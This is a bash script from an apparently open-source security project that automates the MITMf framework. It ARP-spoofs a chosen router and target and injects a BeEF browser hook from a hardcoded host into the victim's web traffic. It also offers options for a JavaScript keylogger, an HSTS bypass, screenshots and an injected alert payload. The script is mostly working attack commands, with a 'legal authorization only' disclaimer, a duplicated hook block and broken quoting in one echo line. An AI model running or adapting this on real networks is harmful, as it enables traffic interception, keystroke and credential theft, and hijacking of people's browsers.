#!/bin/bash

#################################################################################
################### FREE - mitmf - under GPLv3                ###################
################### by Mathias Gut, Netchange Informatik GmbH ###################
################### From the freecybersecurity.org Project    ###################
################### Thanks to the community for the ideas     ###################
################### integrated into this skeleton.            ###################
#################################################################################

# Wichtig vorher den installer mit -i ausführen


#######################
### Preparing tasks ###
#######################

#Check root rights (sudo) before execution.
if [ $(id -u) -ne 0 ]; then
        echo "You need root rights (sudo)."
        exit
fi
#Check if a program is installed.
funcCheckProg() {
        local _program
        local _count
        local _i

        _program=(vi)
        for _i in "${_program[@]}"; do
                if [ -z $(command -v ${_i}) ]; then
                        echo "${_i} is not installed."
                        _count=1
                fi
        done

        if [[ ${_count} -eq 1 ]]; then
                exit
        fi
}

funcCheckProg

###############################
### EXAMPLE TOOL USAGE TEXT ###
###############################

funcHelp() {
        echo "From the Free OCSAF project"
        echo "Free OCSAF PWNED 0.1 - GPLv3 (https://freecybersecurity.org)"
        echo "Use only with legal authorization and at your own risk!"
        echo "ANY LIABILITY WILL BE REJECTED!"
        echo ""
        echo "USAGE:" 
        echo "  ./mitmf.sh -r <router>"
        echo "  ./mitmf.sh -t <target>"
        echo ""
        echo "EXAMPLE:"
        echo "  ./mitmf.sh -r 10.0.0.1 -t 10.0.0.10"
        echo ""
        echo "OPTIONS:"
        echo "  -h, help - this beautiful text"
        echo "  -i, mitmf-installeri"
        echo "  -r <router> - or target1"
        echo "  -t <target> - or target2"
        echo "  -b - JS-Url to beef-xss"
        echo "  -f <js-file> - JScript File"
        echo "  -k - keylogger"
        echo "  -n - no tls with hsts bypass"
        echo "  -p - payload js test"
        echo "  -s - screenshots"
        echo "  -u - upsidedown"
        echo "  -c, no color scheme set"
        echo ""
        echo "NOTES:"
        echo "#See also the MAN PAGE - https://freecybersecurity.org"
}


###############################
### GETOPTS - TOOL OPTIONS  ###
###############################
while getopts "r:t:j:hibfknpsuc" opt; do
        case ${opt} in
                h) funcHelp; exit 1;;
                i) _INST=1;;
                r) _ROUTER="$OPTARG"; _CHECKARG1=1;;
                t) _TARGET="$OPTARG"; _CHECKARG2=1;;
                b) _BEEF=1;;
                f) _PAYLOADFILE=1;;
                k) _KEYLOGGER=1;;
                j) _JSURL="$OPTARG";;
                n) _HSTS=1;;
                p) _PAYLOAD=1;;
                s) _SCREEN=1;;
                u) _UPSIDEDOWN=1;;
                c) _COLORS=1;;
                \?) echo "**Unknown option**" >&2; echo ""; funcHelp; exit 1;;
                :) echo "**Missing option argument**" >&2; echo ""; funcHelp; exit 1;;
                *) funcHelp; exit 1;;
        esac
        done
        shift $(( OPTIND - 1 ))

#Check if _CHECKARG1 or/and _CHECKARG2 is set
if [ "${_INST}" == "" ] && [ "${_CHECKARG1}" == "" ] && [ "${_CHECKARG2}" == "" ]; then
        echo "**No argument set**"
        echo ""
        funcHelp
        exit 1
fi

###############
### COLORS  ###
###############

#Colors directly in the script.
if [[ ${_COLORS} -eq 1 ]]; then
        cOFF=''
        rON=''
        gON=''
        yON=''
else
        cOFF='\e[39m'     #color OFF / Default color
        rON='\e[31m'      #red color ON
        gON='\e[32m'      #green color ON
        yON='\e[33m'      #yellow color ON
fi


#################################
#### MITMF Automator function ###
#################################
funcMitminst() {

        apt-get install python-dev python-setuptools -y
        apt-get install libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev -y
        apt-get install libcapstone3 libcapstone-dev libffi-dev file -y

        apt-get install python-pip -y
        pip install wheel                     #Nach Fehler eingefügt

        #pip install virtualenvwrapper
        #source /usr/bin/virtualenvwrapper.sh

        git clone https://github.com/byt3bl33d3r/MITMf
        cd MITMf && git submodule init && git submodule update --recursive
        pip install -r requirements.txt
        pip install Twisted==15.5.0
}

funcMitmf() {

        local _inst=${_INST}
        local _router=${_ROUTER}
        local _target=${_TARGET}
        local _payloadfile=${_PAYLOADFILE}
        local _beef=${_BEEF}
        local _jsurl=${_JSURL}
        local _keylogger=${_KEYLOGGER}
        local _hsts=${_HSTS}
        local _payload=${_PAYLOAD}
        local _payload2
        local _screen=${_SCREEN}
        local _upsidedown=${_UPSIDEDOWN}
        local _colors=${_COLORS}

        if [ "$_inst" == "1" ]; then            #Installer / getestet
                funcMitminst
        fi

        if [ "$_beef" == "1" ]; then
                if ! [ -d "./temp" ]; then
                        mkdir ./temp
                fi

                _ip=$(hostname -I | cut -d " " -f1)
                echo "<script src="http://10.0.2.28:3000/hook.js"></script>" > ./temp/inject.js

                _payload="--inject --js-file"
                _payload2="/home/kali/MITMf/temp/inject.js"
        #else
        #        _ip=""
        #        _payload=""
        fi
        
        if [ "$_beef" == "1" ]; then
                if ! [ -d "./temp" ]; then
                        mkdir ./temp
                fi

                _ip=$(hostname -I | cut -d " " -f1)
                echo "<script src="http://10.0.2.28:3000/hook.js"></script>" > ./temp/inject.js

                _payload="--inject --js-file"
                _payload2="/home/kali/MITMf/temp/inject.js"
        #else
        #        _ip=""
        #        _payload=""
        fi
        
        if [ "$_jsurl" != "" ]; then
                _ip=$(hostname -I)
                _jsurl="--inject --js-url http://${_ip}:3000/hook.js"
        else
                _js=""
                _jsurl=""
        fi

        if [ "$_keylogger" == "1" ]; then               #Keylogger getestet
                _keylogger="--jskeylogger"
        else
                _keylogger=""
        fi
        
        if [ "$_hsts" == "1" ]; then                    #HSTS getestet
                _hsts="--hsts"
        else
                _hsts=""
        fi

        if [ "$_screen" == "1" ]; then                  #Screenshot getestet
                _screen="--screen"
                echo "PNG in ./logs/*.png"
        else
                _screen=""
        fi

        if [ "$_upsidedown" == "1" ]; then              #Upsidedown getestet
                _upsidedown="--upsidedownternet"
        else
                _upsidedown=""
        fi

        if [ "$_payload" == "1" ]; then                 #js-Payload getestet
                _payload="--inject --js-file"
                touch js_Payload_TeSt.js
                echo 'alert('"'Du bist gehackt!'"');' > js_Payload_TeSt.js
                _payload2="js_Payload_TeSt.js"
                #_payload2="alert('Du bist gehackt!');"
        #else
        #       _payload=""
        #       _payload2=""
        fi

        python mitmf.py --arp --spoof ${_keylogger} ${_hsts} ${_screen} ${_upsidedown} ${_payload} ${_payload2} ${_payload3} --gateway ${_router} --targets ${_target} -i eth0
        # python mitmf.py --arp --spoof ${_keylogger} ${_screen} ${_upsidedown} ${_payload} "${_payload2}" ${_payload3} --gateway ${_router} --targets ${_target} -i eth0

}


############
### MAIN ###
############

echo ""
echo "##########################################"
echo "####  FREE OCSAF BASH SKELETON GPLv3  ####"
echo "####  https://freecybersecurity.org   ####"
echo "##########################################"
echo ""

if [ "${_CHECKARG1}" == "1" ] || [ "${_INST}" == "1" ]; then        #For one argument
        funcMitmf
        echo ""
fi

################### END ###################
